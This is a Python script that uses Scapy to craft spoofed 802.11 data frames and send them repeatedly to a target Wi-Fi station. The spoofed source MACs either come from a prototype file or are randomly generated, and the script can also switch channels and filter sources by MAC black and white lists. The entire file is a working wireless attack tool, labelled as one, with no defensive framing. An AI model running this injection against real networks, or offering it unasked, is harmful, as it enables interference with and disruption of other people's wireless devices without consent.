import re
import argparse
import os
import subprocess
import random
import threading
import time
from scapy.all import *

black_list = []
white_list = []

monitor_timer = 5

def attack_sustain(infile, dwell_count, attack, channel):
	attack_list = []

	if channel:
		os.system('iwconfig {} channel {}'.format(interface, channel))

	if infile:
		with open(infile, 'r') as f:
			for line in f.readlines():
				l = line.strip().split(' ')
				attack_list.append(l[1:])

	starttime = time.time()

	while((monitor_timer == 0) or (time.time() - starttime < monitor_timer)):
		if not infile:
			fake_station = random.randbytes(6)
			fake_station = ':'.join(['{:02x}'.format(x) for x in fake_station])
			thisid = random.choice([11264, 14849, 26114, 22529, 26625])
			thissc = random.randint(0x0000, 0xffff) & 0xfff0
			attack_list = [[None, fake_station, None, 2, 4, 1, thisid, thissc]]
		
		for i in attack_list:
			if black_list and (i[1] in black_list):
				continue
			if white_list and not (i[1] in white_list):
				continue
			t = RadioTap()/Dot11(addr1=attack, addr2=i[1], addr3=attack, type=int(i[3]), subtype=int(i[4]), 
										FCfield=int(i[5]), ID=int(i[6]), SC=int(i[7]))
			print('Sending {} frames to {}'.format(dwell_count, attack))
			for i in range(0, dwell_count):
				sendp(t, iface=interface, verbose=False)

if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument('-c', '--channel', type=int, default=None, help='Channel to send attack on')
	parser.add_argument('-i', '--interface', default='wlan0mon', help='Interface to monitor')
	parser.add_argument('-b', '--blacklist', nargs='+', default=[], help='Blacklist of mac addresses to avoid targeting')
	parser.add_argument('-w', '--whitelist', nargs='+', default=[], help='Whitelist of mac addresses to target')
	parser.add_argument('-t', '--time', default=monitor_timer, type=int, help='Time in seconds to sustain attack')

	parser.add_argument('-p', '--prototypes', help='Input file of attack prototypes')
	parser.add_argument('-s', '--station', help='Station to target', required=True)
	parser.add_argument('-d', '--dwell', default=10, type=int, help='Number of times to send an attack')

	args = parser.parse_args()
	
	interface = args.interface
	black_list = [x.lower() for x in args.blacklist]
	white_list = [x.lower() for x in args.whitelist]
	monitor_timer = args.time

	attack_sustain(args.prototypes, args.dwell, args.station, args.channel)